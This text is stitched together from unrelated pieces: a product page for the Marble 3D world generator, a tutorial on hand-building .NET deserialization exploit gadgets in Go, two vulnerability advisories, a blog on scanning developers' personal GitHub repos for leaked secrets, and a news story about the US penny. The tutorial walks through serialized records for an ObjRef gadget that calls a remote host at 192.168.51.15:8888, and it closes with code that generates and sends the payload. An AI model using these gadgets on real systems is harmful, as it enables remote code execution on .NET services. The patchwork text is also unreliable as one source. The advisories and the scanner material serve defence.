Marble must invent all the details of the world that are not present in the input text or image prompt.
This is often magical;
but sometimes you may want to steer Marble more directly toward a desired world.Multi-Image and Video to WorldAn easy way to create worlds with more creative control is .
Marble can accept different prompt images for different parts of the world,
stitching them together into a unified 3D world.Multi-image prompts let you create worlds with more precision.
Unlike text or single-image prompts where Marble must invent all parts of the world not
present in the prompt, with multi-image prompts you can control what the generated
world will look like from different angles.This leads to a brand-new workflow for generating worlds.
You can use your favorite image generation tool to iterate separately on the
input views, and Marble will lift them into full 3D worlds while also adding
seamless transitions between the input views.Multi-image prompts can also be used to create worlds inspired by real-world spaces.
Marble can input a few photos or a short video depicting a real-world location from
different angles, and it will combine them to generate a 3D world with elements of
the real-world space.The creative process is highly iterative for many users.
Often, generating a world is only the start of a creative journey.
Seeing a generated 3D world often kicks off a dozen more ideas for
changing it or improving it.Marble includes AI-native world editing tools.
Edits can be small and local: remove an object, touch up an area.
They can also be more drastic: swap objects, change the visual style,
or re-structure large parts of the world.
This gives a new level of fine-grained control to the world creation process.Edit: Turn the entire back wall into a stage, and replace the tables with low benches facing the stageEdit: Turn the entire back wall into a stage, and replace the tables with low benches facing the stageWorld editing lets you re-imagine the same space in endless different ways.Edit: Change all the kitchen counters to black graniteEdit: Change all the kitchen counters to black graniteChisel: Sculpting Worlds in 3DMarble's multimodal inputs and editing features give a lot of control over your generated 3D worlds.
But sometimes, creating the world exactly as you see it in your mind's eye requires finer-grained control
over the scene layout or exact sizes and positions of objects.For these situations we are introducing , an AI-native tool to sculpt Marble worlds directly in 3D.Chisel is a new experimental editing mode for advanced users to create 3D worlds.
It lets you lay out the coarse structure of your world in 3D
using coarse 3D shapes like boxes or planes,
or importing existing 3D assets into the scene.After laying out the coarse 3D scene, you can add a text prompt to describe the visual style of the scene,
or additional elements not present in the coarse layout.
Marble will combine these inputs to give you a fully detailed 3D world.Chisel decouples  from .
The coarse 3D scene determines the world's structure,
while the text prompt controls its overall style.
The two can be mixed in any combination, adding a whole new dimension of control to world generation.Text prompt: A beautiful modern art museum with wooden flooring, filled with colorful paintings and curving sculpturesText prompt: A beautiful modern art museum with wooden flooring, filled with colorful paintings and curving sculpturesThe coarse 3D scene can be as simple or complex as you want.
In addition to building the coarse 3D scene out of basic blocks and walls,
you can import existing 3D assets of objects.
Objects will be restyled based on the text prompt to give a cohesive 3D world.Varying the text prompt can give rise to 3D worlds with drastically different
visual styles and appearances that all share a common structure determined
by the coarse 3D scene.Text Prompt: A serene scandinavian guesthouse bedroom with stunning views of glaciersText Prompt: A serene scandinavian guesthouse bedroom with stunning views of glaciersBuilding Large Worlds by Expanding and ComposingSometimes bigger really is better.
Larger worlds give more possibilities, more space, more room for your creativity to shine.
Marble offers two ways to make bigger worlds than ever before.After a world has been generated, Marble allows one-step  to make it larger.
You are in control of this process: you can select a region of the world to
be expanded, and Marble will create more content to fill the selected region.Expansion can make worlds larger. Regions of the world that previously broke
down into artifacts can become crisp and clean after expansion.
Expansion can also be used to add detail to targeted regions of a world.
Sometimes the back of a table or the far corner of a room is not a crisp
as the room's center; expanding the world in that region can improve it.Marble can expand scenes to create larger traversable areasMarble can expand scenes to create larger traversable areasIn addition to generating individual worlds, you can  any number of
worlds to build out extremely large spaces with Marble's composer mode.
This composition is entirely under your control: you can choose exactly which worlds
to compose, and exactly how to lay them out relative to each other.
Composing is yet another way to build worlds that follow your creative vision.A large train composed with MarbleA large train composed with MarbleExporting Worlds to 3D and VideoAfter creating a world with Marble you have many options to export it
for incorporation into downstream projects. are the highest-fidelity representation for Marble worlds.
They represent 3D scenes as a large set of semitransparent particles.
You can render Gaussian splats in the browser using Spark,
our open-source cross-platform renderer integrated with THREE.js.Marble worlds can also be exported as triangle meshes.
Marble can generate both , which are low-fidelity meshes intended for
coarse physics simulation; and  which are intended to match the
visual fidelity of Gaussian splats as closely as possible.
Exporting worlds as meshes lets them interoperate with many industry-standard tools.Marble can export generated worlds as Gaussian splats or triangle meshesMarble can export generated worlds as Gaussian splats or triangle meshesMarble worlds exist in full 3D, but sometimes a video is the best way to share a world.
You can use Marble to render generated worlds to videos with pixel-accurate camera control,
letting you frame every shot just as you imagine it.
In fact, nearly all the videos in this post were generated directly from Marble.Marble can also  exported videos.
Enhanced videos can add detail, remove artifacts, and add dynamic elements to the scene,
while maintaining pixel-perfect camera control and adhering to the structure of the
generated 3D world.Enhanced videos clean up artifacts and introduce motion in the scene. Notice the smoke above the chimney, the dancing flames, and the flowing water.Enhanced videos clean up artifacts and introduce motion in the scene.

This article discusses how that library came to be while providing enough information into that process to allow others to create their own gadget chains by hand if they so please. At the end, we discuss how to use the new go-exploit library to generate deserialization payloads (without the need for Windows), or for integration in your own Golang-based exploits, regardless of whether or not they use go-exploit. Our library is designed to be used "out of the box" by any Go program without needing to define or set up any special objects. You can learn more about the advantages of go-exploit here.Challenges of adding deserialization payloads into exploitsHow to create your own deserialization library, including a technical breakdown of .NET serialization streamsHow to use VulnCheck's own .NET deserialization library for golang-based exploitsWhen you are writing .NET deserialization exploits in a language other than C# and you want dynamic parameters in your payload, your options are generally limited to "shelling out" to ysoserial.net or pasting in a binary array that was  by ysoserial.net and then editing it at runtime.Neither of these options is great. The first option demands that you use a specific program on a specific operating system (Windows) to create the gadgets. The second option is prone to mistakes due to the length encoding of strings and certain records being incorrectly implemented; it also makes the payload less modifiable/clean.We instead opt for a third option: to create the .NET gadgets "by hand" for our golang-based exploit framework, go-exploit.
In doing so, we learned a great deal about the .NET serialization stream structure and will present it in this article to help those wishing to do something similar in their own framework or anyone just wanting to learn more about serialization streams.Though this article is written in the context of golang, the same ideas should be transferable to any other language.I am going to show how .NET deserialization objects are broken down by looking at what their sub-components are and how they are constructed during serialization. After that I will show you how to create your own serialization library that would allow you to recreate these gadgets in any language. Finally, I will show how to use gadgets directly from the new go-exploit library..NET deserialization payloads are effectively a stream of "Records" which can be thought of as structs. Given that records are effectively structs, it makes sense that to create gadgets, we should make structs and then place them in a byte array such that we produce a sane gadget at the end.Throughout this tutorial we will be using an ObjRef gadget, viewable using this cyberchef link. I chose this gadget because it is small and simple; other gadgets are generally much larger.The very first record we will look at in the stream is a static record that begins every serialized .NET stream, the SerializationHeaderRecord.Here is the hex dump for the SerializationHeaderRecord:00000000  00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00  |.....ÿÿÿÿ.......|
00000010  00                                               |.|
According to the documentation above: "The SerializationHeaderRecord record MUST be the first record in a binary serialization. This record has the major and minor version of the format and the IDs of the top object and the headers."Almost every link in this article will be to Microsoft documentation and while I am certain that you know how to read given that you've made it this far, I have dropped a few tips below to ease interpretation of these pages for those who are unfamiliar with the format.There is a table representing the layout of the record; I find this table more confusing than helpful so you may want to consider ignoring it (see image below for clarification).The information  the table that breaks down each member of the struct is typically much more useful and easier to read.The member information in the documentation is in the same order that the members appear within the records.You can assume all INT32 values are little-endian.It is important to read all member descriptions.Now that we know how to decipher the Microsoft docs, let's get on to the first member in the record, RecordTypeEnum.The description for this member reads: "RecordTypeEnum (1 byte): A RecordTypeEnumeration value that identifies the record type. The value MUST be 0."When reversing serialized streams on your own for reconstruction, this byte is the first byte you will see for a given record and it tells you what record is coming next. In this case, we saw a , so we know a SerializationHeaderRecord is coming.Every record type has its own  that is 1 byte, and each record has a different number that is sequential based on their order in the RecordTypeEnumeration. That link contains a list of all the record types, of which only a subset have been useful for payloads, having written about a dozen or so gadgets by hand. With that said, I would  suggest going ahead and implementing every gadget, but rather build them as needed.So for a SerializationHeaderRecord, this value will ALWAYS be  in hexidecimal, so we should represent this as a constant somewhere in our code. In the Microsoft docs you see that RecordTypeEnumeration is exactly that, an enum, so we should just make an enum for record types in our code. I am using Golang, which does not have have enums natively, and while there are methods for creating them in go, I will just use a string map because that will serve my purposes just fine here. Using the Microsoft docs as reference, it looks something like this:var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    "ClassWithId":                    1,
    "SystemClassWithMembers":         2,
    "ClassWithMembers":               3,
    "SystemClassWithMembersAndTypes": 4,
    "ClassWithMembersAndTypes":       5,
    "BinaryObjectString":             6,
    "BinaryArray":                    7,
    "MemberPrimitiveTyped":           8,
    "MemberReference":                9,
    "ObjectNull":                     10,
    "MessageEnd":                     11,
    "BinaryLibrary":                  12,
    "ObjectNullMultiple256":          13,
    "ObjectNullMultiple":             14,
    "ArraySinglePrimitive":           15,
    "ArraySingleObject":              16,
    "ArraySingleString":              17,
    "MethodCall":                     21,
    "MethodReturn":                   22,
}
The next member is RootId (4 bytes), which is described as "An INT32 value (as specified in  section 2.2.22) that identifies the root of the graph of nodes."This is a variable value, so let's add it to the struct as an int. Remember that we did not add RecordTypeEnum because this is a constant/static value.// The start of our SerializationHeaderRecord struct
type SerializationHeaderRecord struct {
    RootID int
}
Remembering that all INT32 values are little-endian, and knowing that this is a  from the hex dump, we know we need to have this member output . That said, we can start making some methods for our struct to produce the binary output for this record:// NOTE: SerializationHeaderRecord struct is still incomplete
var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    ... // omitted for brevity
}
type SerializationHeaderRecord struct {
    RootID int
}
func (serializationHeaderRecord SerializationHeaderRecord) RecordToBin() (string, bool) {
    recordTypeEnumString := string(byte(RecordTypeEnumMap["SerializedStreamHeader"]))
    rootIDString := transform.PackLittleInt32(serializationHeaderRecord.RootID)
    return recordTypeEnumString + rootIDString, true
}
shr := SerializationHeaderRecord{ RootID: 1 }
shr.RecordToBin() // should yield "\x00\x01\x00\x00\x00" at this time
This is the basic idea and structure of how to create these records and ultimately turn them into binary streams. Enough records converted into binary streams in the right order, you have a finished serialization stream!Continuing on, the next member is the HeaderId, which much like the previous member, is described as a variable INT32 value. We will add this to the struct as an int:type SerializationHeaderRecord struct {
    RootID   int
    HeaderID int
}
The MajorVersion and MinorVersion are a little different from the last two members as they MUST be 1 and 0 respectively.
We do not need to add them to the struct, but instead just update the  method for this struct to finish off our implementation of this record.type Record interface {
    ToRecordBin() (string, bool)
}

var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    ... // omitted for brevity
}

type SerializationHeaderRecord struct {
    RootID int
    HeaderID int
}

func (serializationHeaderRecord SerializationHeaderRecord) RecordToBin() (string, bool) {
    recordTypeEnumString := string(byte(RecordTypeEnumMap["SerializedStreamHeader"])) // 0
    rootIDString := transform.PackLittleInt32(serializationHeaderRecord.RootID)
    headerIDString := transform.PackLittleInt32(serializationHeaderRecord.HeaderID)
    majorVersion := transform.PackLittleInt32(1) // MUST be 1
    minorVersion := transform.PackLittleInt32(0) // MUST be 0
    return recordTypeEnumString + rootIDString + headerIDString + majorVersion + minorVersion, true
}

shr := SerializationHeaderRecord{ RootID: 1 , HeaderID: -1 }

shr.RecordToBin() // should yield "\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"

// add it to the full gadget being built
var gadgetRecords []Record
gadgetRecords = append(gadgetRecords, shr) // adding serialization header record to the gadget

The SystemClassWithMembersAndTypes record starts at offset 0x11. This is sort of the "main" record that you will see in .NET gadgets, or its alternative, ClassWithMembersAndTypes. By main record I mean, this is the record that actually defines the object/class that is intended to be deserialized which is sort of the "point" of a serialization stream. The difference between the two types above (SystemClassWithMembersAndTypes and ClassWithMembersAndTypes) is that the SystemClassWithMembersAndTypes is missing a LibraryID, as it is implicitly understood to be a system class and does not need it explicitly defined. Otherwise, these two records are the same.These class records are quite verbose as they are primarily composed of two other (non-record) data structures: a ClassInfo and a MemberTypeInfo. Viewing the documentation, we again see a RecordTypeEnum indicating that this is a SystemClassWithMembersAndTypes record which in this case, must be a 4. If you look, this is already present in our RecordTypeEnumMap above.Moving onto the ClassInfo member, we can model it as a struct like so:type ClassInfo struct {
    ObjectID int          // A value represented as an INT32
    Name string           // Length prefixed string
    MemberCount int       // should be equal to len(MemberNames) // this could also just be created dynamically during to ToRecordBin() method
    MemberNames []string  // MemberNames
}
The first member of this struct is an Object ID. These are not specific to ClassInfo structures but are actually a part of many other records and structures that compose .NET serialization streams. These are basically used as unique identifiers or even "addresses" to reference objects throughout a serialization stream. These generally increment by 1 with each new object added to a stream.The value for this one, as show in the dump output above, should be a 1. Represented as a little-endian INT32 ().Next is the Name. This is the name of the actual class, though it is not a normal string but is instead a LengthPrefixedString. Do not assume this is "just an int of the length" — it is encoded in a specific way as defined in the documentation. Though for shorter length strings this  usually come out to simply be something like hex(len(string)).To make things easier, I will leave the appropriate function for encoding this length below, from our go-exploit dotnet package.func Write7BitEncodedInt(value int) []byte {
    var (
        bs []byte
        v  = uint(value)
    )
    for v >= 0x80 {
        bs = append(bs, byte(v|0x80))
        v >>= 7
    }
    bs = append(bs, byte(v))
    return bs
}
The Name for this one is "System.Exception", which makes sense, given that this is a system class and we are dealing with a SystemClassWithMembersAndTypes. But do not forget to prefix it with the encoded length (16, which in this case comes out to ), making it: .Next is MemberCount, another INT32 value. As the name suggests, this is the number of members that are defined in the next item in the struct, the MemberNames. As the dump shows, this is a 1, which we know will be represented as .Last in ClassInfo, is the array of MemberNames, which is a sequence of LengthPrefixedStrings. These define the member names for the class. Remember we should only expect to read N members from this where N == MemberCount. In this case, the only member name present should be "ClassName" with its length prefix in hex: .So that does it for ClassInfo, but remember that was just one component of the SystemClassWithMembersAndTypes; the next is the MemberTypeInfo, a data structure that exists to provide information ABOUT the members of the class.Do not be fooled by how few members are shown in the documentation. This component is probably the source of the most confusion when building these serialization objects by hand, primarily due to "AdditionalInfos".First is BinaryTypeEnums. Per the docs, this is a sequence of single bytes that denote the data TYPE for each member of the class. The attribution of a given type to its corresponding member is derived from the POSITION of the individiual BinaryTypeEnum in the sequence relative to the sequence of class members. All possible BinaryTypeEnum values are located here.That was probably a bit unclear, so for example, if you have three members in a class, let's say they are someStringOne (String), someStringTwo (String), and someIntThree (Int).// note: this is pseudocode
class SomeClass {
    someStringOne string
    someStringTwo string
    someIntThree  int
}
The MemberTypeInfo.BinaryTypeEnums section for that class should simply be: "\x01\x01\x00".This is because according to the BinaryTypeEnum values documentation, "\x01" denotes a string of which there are two here. The int value, however, is not represented as its own enum value — this is where it gets a tad bit more confusing.According to these docs, an int value is a primitive type and is therefore defined as a PrimitiveTypeEnum value. So we mark its BinaryTypeEnum value as a "\x00" (Primitive) so that when the stream is read it knows to look at the next section (AdditionalInfos) to determine the  type of this member.So to recap, our hypothetical "\x01\x01\x00" is described as a string (0x01), another string (0x01), and a primitive type (0x00) which we define as an int in the next section, AdditionalInfos.This is a data structure that in some class-based records will not be used at all. It is ONLY present if and when one of the BinaryTypeEnums are either Primitive, SystemClass, Class, or PrimitiveArray. An easy way to remember it is to see if any of the BinaryTypeEnums have primitive or class in their names. If the binary type for a given member is anything OTHER than those four, an AdditionalInfos entry is NOT needed for that member. If NONE of the members' BinaryTypeEnums values are primitive or class based, then you can omit the AdditionalInfos component entirely.Depending on if it is a Primitive, SystemClass, Class, or PrimitiveArray, a different type of value is expected in the AdditionalInfo data structure. Keep in mind also that the values within the AdditionalInfos data are position-correspondent, just like BinaryTypeEnum itself. This means that a given value within the AdditionalInfos section corresponds with the position of the BinaryTypeEnum requiring an AdditionalInfos value to be added.To clarify further... if you had someStringOne, someIntTwo, someStringThree, and someIntFour, they would have a BinaryTypeEnum section of . Of those four BinaryTypeEnums, only TWO of them require an AdditionalInfos entry, so the entire AdditionalInfos section for those members would be  (0x08 denotes INT32). The first  would correspond to someIntTwo, and the second  would correspond to someIntFour; the strings are ignored because they are not a Primitive, PrimitiveArray, SystemClass, or Class BinaryTypeEnum and thus do not need AdditionalInfos for them.I hope that made sense, because now we will look at the AdditionalInfos section for the SystemClassWithMembersAndTypes from our ObjRef example which uses a slightly more complicated BinaryType to define which is the SystemClass as denoted by the  in the BinaryTypeEnums section. To aid the reader, this BinaryTypeEnum is located at offset 0x35 of the CyberChef dump.If we look at the MemberTypeInfo documentation again, specifically at the AdditionalInfos section, we see the following sentence: "For the BinaryTypeEnum value of SystemClass, this field specifies the name of the class (2)". So that means slap a string in there, and of course it must be a LengthPrefixedString not just a string by itself.So just to summarize, the BinaryTypeEnums section for this SystemClassWithMembersAndTypes's MemberTypeInfo section is . Immediately following that, we start the AdditionalInfos if needed. Because the BinaryTypeEnums section contains a SystemClass BinaryTypeEnum, we DO need to provide an AdditionalInfos section, which in this case must be the name for the system class. Therefore, the AdditionalInfos section for this SystemClassWithMembersAndTypes's MemberTypeInfo section would be the prefix , followed immediately by "System.Runtime.Remoting.ObjRef". If there  more Primitive or Class-based BinaryTypeEnum defined in the BinaryTypeEnums section of this MemberTypeInfo, then AdditionalInfos entries would immediately follow this LengthPrefixedString.Great, so we have exhausted all of the members for SystemClassWithMembersAndTypes which ends at offset 0x54. So what is all the stuff after it in the CyberChef hexdump output?Well, we know that the SystemClassWithMembersAndTypes has ended because we made all of the sections per the defined specification. When a record ends in a serialization stream, the next byte is generally a new record; therefore the RecordTypeEnumeration documentation must be consulted. But something else that has not been revealed thus far and is not described well in the relevant Microsoft documentation: when a MemberTypeInfo ends, what generally follows immediately after is the VALUE for those defined members, one after another in a sequence.Knowing that, we can assume that the next record is the VALUE for the members we just defined. According to the RecordTypeEnumeration documentation, the next byte, a  (offset 0x55), is a MemberReference record. If you remember above where I talked about ObjectIDs, this is where the primary record references those.If you look at the documentation for the MemberReference.IdRef section, it says that the ObjectID can be for an object that comes after OR before the referencing record. If we said the ObjectID is like a memory address of an object, you can think of the MemberReference as a pointer to these objects — this way, if that object is referenced multiple times, you do not need to redefine the entire object record but can instead just provide a MemberReference record to an already defined object, which is only 5 bytes rather than the size of an entirely new object.type MemberReferenceRecord struct {
    RecordTypeEnum int // 1 BYTE, ALWAYS a 0x09
    IDRef int          // 4 BYTES - INT32 value containing the ObjectID that is being referenced
}
Given that the only previous object we defined (the "System.Exception" SystemClassWithMembersAndTypes) has an ObjectID of 1, we can assume the referenced object will come AFTER this record in the serialization stream. This assumption stands true, as the very next record  have an objectID of  and it should be familiar since it is another SystemClassWithMembersAndTypes. To clarify, the VALUE for the only member in the previously defined SystemClassWithMembersAndTypes ultimately points to  SystemClassWithMembersAndTypes.Again, here is the full dump for easier reference:00000000  00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00  |.....ÿÿÿÿ.......|

Our new record begins at hex 0x5A.I will not rehash everything since we have already defined a very similar record, but I  define the values in case there is confusion. You could also stop here and try and make it yourself if that sounds like fun to you.SystemClassWithMembersAndTypes.RecordTypeEnum = 4 SystemClassWithMembersAndTypes.ClassInfo.ObjectID = 2 , This should look familiar from the immediately preceding MemberReference record.SystemClassWithMembersAndTypes.ClassInfo.Name = lenPrefix  + "System.Runtime.Remoting.ObjRef", Should also familiar from the AdditionalInfos section of Object 1.SystemClassWithMembersAndTypes.ClassInfo.MemberCount = 1 SystemClassWithMembersAndTypes.ClassInfo.MemberNames = lenPrefix  followed by the string: SystemClassWithMembersAndTypes.MemberTypeInfo.BinaryTypeEnums = . States that the only member for this class if of type: string.SystemClassWithMembersAndTypes.MemberTypeInfo.AdditionalInfo = "", nothing for this as we do not need it; none of the BinaryTypeEnums are Classes or Primitives based, all we have is a string.Those are all of the values for all of the components of  object, but as we know, we defined one member; therefore, we must provide one member value immediately following the SystemClassWithMembersAndTypes, and because this a serialization stream, we cannot simply have random values floating around in the stream. All things must be defined in a RECORD since once again, a serialization stream is a sequence of records.With all of that said, the member type that we defined is of BinaryTypeEnum , which is a string. So how do we represent a string as a record? Using the next record in the dump, a BinaryObjectString, defined below.type BinaryObjectString struct {
    RecordTypeEnum int // 1 BYTE - ALWAYS 0x06
    ObjectID int       // 4 BYTES - INT32. This is a record, therefore it needs an ObjectID in case it needs to be referenced
    Value string       // This needs to be a LengthPrefixedString. This contains the value for the string.
}
So immediately following that SystemClassWithMembersAndTypes (Object 2), we define the next object in the stream as such:BinaryObjectString.RecordTypeEnum = 0x06BinaryObjectString.ObjectID = BinaryObjectString.Value = lenPrefix  followed by  "http://192.168.51.15:8888/hcQaAT"Then we end the entire serialization stream using the MessageEnd Record. This is the simplest record of all, it is just a  that denotes the end of the stream.With all of the structs defined, and the process for understading them under wraps, all that is left is to define a method similar to the  shown in the earlier example for each of the discussed records and then concatenate those results in the same order as the dump. This is left as an exercise for the reader.You could also use our go-exploit library as a reference or for gadget generation. Also, do note that this was a rather small serialization stream example; there are much more complicated gadgets, some of which contain serialization streams as values inside of other serialization stream records. Even so, construction of those should all follow the same basic principles explained in this article.Using VulnCheck's go-exploit library to generate the ObjRef payload is as simple as:package main
import (
    "github.com/vulncheck-oss/go-exploit/dotnet"
)
func main() {
    payload := dotnet.CreateObjectRef("something", dotnet.BinaryFormatter) // gadget generated!
    sendPayload(payload)
}

 Nov. 12, 2025, 9:15 p.m. | 23 hours, 57 minutes ago
Evervault is a payment security solution. A vulnerability was identified in the `evervault-go` SDK’s attestation verification logic in versions of `evervault-go` prior to 1.3.2 that may allow incomplete documents to pass validation. This may cause the client to trust an enclave operator that does not meet expected integrity guarantees. The exploitability of this issue is limited in Evervault-hosted environments as an attacker would require the pre-requisite ability to serve requests from specific evervault domain names, following from our ACME challenge based TLS certificate acquisition pipeline. The vulnerability primarily affects applications which only check PCR8. Though the efficacy is also reduced for applications that check all PCR values, the impact is largely remediated by checking PCR 0, 1 and 2. The identified issue has been addressed in version 1.3.2 by validating attestation documents before storing in the cache, and replacing the naive equality checks with a new SatisfiedBy check. Those who useevervault-go to attest Enclaves that are hosted outside of Evervault environments and cannot upgrade have two possible workarounds available. Modify the application logic to fail verification if PCR8 is not explicitly present and non-empty and/or add custom pre-validation to reject documents that omit any required PCRs.

Open Access Management (OpenAM) is an access management solution. In versions prior to 16.0.0, if the "claims_parameter_supported" parameter is activated, it is possible, thanks to the "oidc-claims-extension.groovy" script, to inject the value of one's choice into a claim contained in the id_token or in the user_info. In the request of an authorize function, a claims parameter containing a JSON file can be injected. This JSON file allows attackers to customize the claims returned by the "id_token" and "user_info" files. This allows for a very wide range of vulnerabilities depending on how clients use claims. For example, if some clients rely on an email field to identify a user, an attacker can choose the email address they want, and therefore assume any identity they choose. Version 16.0.0 fixes the issue.

He accidentally creates the repository under his organisation’s user GitHub account (github.com/bob-xyz/internal-api) instead of the organisation account (github.com/xyz-com/internal-api). Worse? He makes it public. Even worse? It contains database credentials in the config files.GitHub’s built-in protections? Completely useless here.Sure, you’ve configured your organisation to make all repositories private by default. You’ve set up branch protection rules, required reviews, and enabled secret scanning. But all of these controls stop at your organisation’s boundary.: GitHub gives you zero control over repositories your organisation members create under their personal accounts — even when those repos contain your company’s code.Why This is a Massive ProblemLet’s be clear about the risk:Every developer in your org is a potential leak vectorPersonal repos are invisible to your security tools exists for what’s being created outside your org can’t track where the company code might be living doesn’t run on personal repos unless the developer enables itDuring a recent bug bounty engagement across several organisations, we discovered alarming exposure patterns. In one target with approximately 100 developers:We identified over 200 personal GitHub repositories containing code patterns matching their internal codebase5% of these repos exposed hardcoded API keys, database credentials, or sensitive configuration files11% contained references to internal hostnames, documentation URLs, or system architectures that aided reconnaissanceNone of this exposure was visible or monitored through their official security toolsThese personal developer accounts represented a completely unmonitored attack surface that traditional security assessments miss entirely.Our Solution: Extending Your Security PerimeterWe built an automated scanner that treats your organisation members’ public repositories as part of your extended security perimeter. Think of it as your security team’s watchtower — constantly monitoring the horizon for potential exposures.Instead of trying to control what we can’t (personal accounts), we monitor and respond to what we can see (public repositories). all members of your GitHub organisation their personal public repositories new repositories since the last scan for secrets, credentials, and sensitive data security teams in real-time via Slack everything for audit and complianceUnder the Hood: How We Built ItThe magic happens through clever use of GitHub’s GraphQL API and incremental scanning. Let’s break down the key components.Discovering Your Extended PerimeterFirst, we identify everyone in your organisation and their public repositories:The Secret Sauce: Incremental ScanningWe don’t scan everything every time — that would be wasteful and hit rate limits. Instead, we maintain state and only scan what’s new:Real-Time Secret DetectionWhen we find new repositories, TruffleHog immediately scans them:We categorise alerts by severity to prevent alert fatigue:After deploying this tool, you will discover just how big your blind spot was.Critical Exposure Scenarios: What Bug Bounty Hunters Actually FindScenario 1: The Conference Demo Disaster. Imagine finding a senior developer’s personal “demo-app” repository while doing reconnaissance. They’ve reused their company’s authentication service as a template for a tech talk — complete with valid JWT signing keys still embedded. This is exactly the kind of finding that turns a $500 bug bounty into a $5,000 critical submission within minutes of discovery.Scenario 2: The Tutorial Time Bomb. Picture discovering a junior developer learning DevOps on their personal GitHub. They’ve uploaded their company’s entire production environment configuration while following a CI/CD tutorial — database strings, API keys, OAuth secrets, all indexed by search engines. These are the goldmines that automated credential scanners feast on before organisations even know they exist.These aren’t edge cases — they’re patterns I’ve seen repeatedly across multiple bug bounty programs where personal developer accounts become the easiest attack vector.Implementation Guide: Protect Your Organisation TodayBefore you start, you’ll need:Step 1: Configure Your Monitoring ScopeDefine which organisations to monitor:Step 2: Set Up AuthenticationCreate a GitHub token with minimal required permissions:Step 3: Deploy Your ScannerOption A: Cron Job (Recommended for getting started)Step 4: Configure AlertingCreate a new Slack app at api.slack.comAdd to your security channelCopy the webhook URL to your  fileYour security team will see alerts like:Operational Excellence: Making It Work at ScaleEvery scan creates an immutable audit trail:GitHub’s API has limits. We handle them gracefully:Incremental Scanning StrategyWe maintain the state to ensure efficiency:Lessons from the TrenchesAfter running this in production for six months, here’s what we learned:1. Education > EnforcementDon’t just alert on problems — use them as teaching moments. We created a “Security Champions” program where developers who accidentally exposed secrets became advocates for secure coding.Include forked repositories in your analysis, but remember that not every personal repository containing company-related code represents a security risk. Many of these may be legitimate open-source contributions — for instance, repositories forked from established projects like xyz/xyz. To avoid false positives and unnecessary alarms, ensure your monitoring alerts include relevant context about the repository’s origin and purpose.The Bigger Picture: Defence in DepthThis scanner is one layer in a comprehensive GitHub security strategy:Take Action: Secure Your Extended Perimeter Today: If you have more than 10 developers in your organisation, you probably have exposed secrets in personal repositories right now.is that you can find and fix them today.Don’t wait for a breach to discover your blind spots. Every minute you delay is another minute your credentials could be harvested by automated scanners crawling GitHub.Get Started in 30 MinutesRun this quick command to see your current exposure:If the number is more than 50, you need this tool yesterday.We’ve Open-Sourced the ToolA big shoutout to Weng Onn Tan for creating this amazing tool.We’ve now open-sourced the scanner so that any security team can use it to uncover blind spots in their GitHub ecosystem. You can explore the code, contribute improvements, and deploy it within your environment here: Repo Guardian on GitHub.Our goal is to help teams extend visibility beyond their organization boundary and catch exposures before attackers do.: Your organisation’s security perimeter doesn’t end at your GitHub organisation boundary. Your developers’ personal repositories are part of your attack surface, whether you monitor them or not.The question isn’t  you should monitor them - it’s  you’ll start.Start today.

            The American penny passed away today after a prolonged illness. It was 238 years old.
    
            The last penny was minted Wednesday afternoon at the US Mint in Philadelphia, overseen by US Treasurer Brandon BeachPresident Donald Trump announced via social media in February that he instructed the Mint to stop making the once-popular coin, citing the cost of production.
    
            The penny costs nearly four cents to mint, more than the coin’s worth. Once valuable enough to buy “penny candy” like gumballs and feed parking meters or toll booths, today the penny lives mostly in coin jars, junk drawers or “leave a penny/take a penny” trays.
    
            Beach said Wednesday that the final coins pressed will be auctioned off and that the actual last pennies put into circulation from the US Mint were struck in June.
            The penny outlived its sibling, the half-penny, by 168 years. It’s survived by the nickel, dime, quarter, and rarely seen half-dollar and dollar coins.
    
            For a coin that seems obsolete, its removal from circulation is causing more problems than expected, especially for retailers.
    
            Some merchants plan to round prices to the nearest nickel, often a penny or two more. Others are asking customers to pay with pennies to help supply. But in some states, merchants could face legal trouble for rounding up or down.
    
            Additionally, any savings from discontinuing the one-cent coin could be offset by the need to press more nickels, which costs the US Mint more money than the penny.
    
            The government’s phasing out of the penny has been “a bit chaotic,” said Mark Weller, executive director of Americans for Common Cents. The pro-penny group is funded primarily by Artazn, the company that provides the blanks used to make pennies. “By the time we reach Christmas, the problems will be more pronounced with retailers not having pennies.”
    
            Weller said other countries that removed low denomination coins, like Canada, Australia and Switzerland, had guidance for afterwards. Not so in the United States.
    
            “We had a social media post (by Trump) during Super Bowl Sunday, but no real plan for what retailers would have to do,” he said, referring to the president’s February announcement.
    
            Kwik Trip, a family-owned convenience store chain that operates in the Midwest, decided to round down cash purchases in stores where it hasn’t been able to find pennies.
    
            “There’s no way that we wanted to charge (customers) an extra 2 cents because we just didn’t think that was fair,” said John McHugh, spokesperson for the company. “I mean, it’s not their fault that there there’s a penny shortage.”
    
            But with 20 million customers a year, and 17% of them paying with cash, the policy will eventually cost Kwik Trip a couple of million dollars a year, McHugh said.
    
            It’s not just businesses that face increased costs. Rounding to the closest nickel will cost consumers about $6 million a year, according to a July study by the Federal Reserve Bank of Richmond. That is fairly modest, coming to about five cents each across 133 million American households.
    
            And rounding is not a national solution.
    
            Four states - Delaware, Connecticut, Michigan and Oregon - as well as numerous cities, including New York, Philadelphia, Miami and Washington, DC, require merchants to provide exact change, according to the National Association of Convenience Stores (NACS).
    
            In addition, the law covering the federal food assistance program known as SNAP requires that recipients not be charged more than other customers. Since SNAP recipients use a debit card that’s charged the precise amount, if merchants round down prices for cash purchases, they could be opening themselves to legal problems and fines, said Jeff Lenard, spokesperson for NACS.
    
            “Rounding down on all transactions presents several challenges beyond the loss of an average of 2 cents per transaction,” Lenard said. “We desperately need legislation that allows rounding so retailers can make change for these customers.”
    
            For that reason, NACS and other retail groups recently wrote to Congress asking for legislation to deal with the questions raised by the end of penny production.
    
            The penny was one of the nation’s first coins, first minted in 1787, six years before the Mint itself was established.
    
            Benjamin Franklin is widely credited with designing the first penny known as the Fugio cent. Its current form arrived in 1909 on the centennial of Abraham Lincoln’s birth, when it became the first American coin to feature a president.
    
            But it has declined in both use and popularity ever since. The Treasury Department now says there are an estimated 300 billion pennies in circulation. That comes to a bit less than $9 for every American. But most of those coins are “severely underutilized.” So, outcry from the public over its demise has been muted.
    
